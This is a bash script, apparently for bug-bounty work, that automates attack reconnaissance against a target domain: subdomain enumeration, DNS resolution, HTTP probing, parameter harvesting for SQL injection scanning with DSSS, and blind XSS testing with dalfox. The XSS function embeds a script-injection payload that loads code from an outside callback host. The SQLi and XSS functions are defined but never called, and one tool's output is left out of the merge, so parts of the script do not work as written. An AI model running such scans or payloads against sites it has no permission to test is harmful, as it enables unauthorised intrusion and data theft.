#!/bin/bash

domain=$1
wordlist="/PATH/TO/WORDLIST.txt"
resolvers="PATH/TO/resolvers.txt"

domain_enum(){

mkdir -p $domain $domain/sources $domain/Recon

subfinder -d $domain -o $domain/sources/subfinder.txt
assetfinder -subs-only $domain | tee $domain/sources/hackerone.com
amass enum -passive -d $domain -o $domain/sources/passive.txt	
shuffledns -d $domain -w $wordlist -r $resolvers -o $domain/sources/shuffledns.txt

cat $domain/sources/*.txt > $domain/sources/all.txt 
}

domain_enum

resolving_domains(){
shuffledns -massdns PATH/TO/massdns -d $domain -list $domain/sources/all.txt -o $domain/domains.txt -r $resolvers
}
resolving_domains 

http_prob(){
cat $domain/domains.txt | httpx -threads 200 -o $domain/sources/works.txt 

}

http_prob

gauq(){
	clear
	echo "Finding SQLi's parameters"
gau $1 -subs | \
	grep "=" | \
	egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | \
	qsreplace -a 

}

sqliz() {
	clear
	echo "Executing SQLi scanner..."
	gauq $1 | python3 PATH/TO/DSSS/dsss.py > $domain/Recon/possible_sqlis.txt

}

bxss() {
	clear
	echo "Executing XSS scanner Tool for Blinds XSS"
	BLIND='"><script src=https://your_server.xss.ht></script>'
	gauq $1 | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | \
	dalfox pipe -b $BLIND
}


zip_files(){
	clear
	echo "Ending process, zipping files, GOOD LUCK!"
zip -r $domain.zip $domain	
}

zip_files